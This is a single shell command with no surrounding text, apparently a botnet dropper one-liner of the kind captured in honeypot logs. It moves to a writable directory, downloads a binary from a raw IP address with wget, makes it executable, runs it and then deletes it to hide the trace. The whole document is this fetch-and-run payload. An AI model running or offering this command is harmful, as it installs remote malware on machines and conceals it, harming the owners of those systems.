cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.133/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
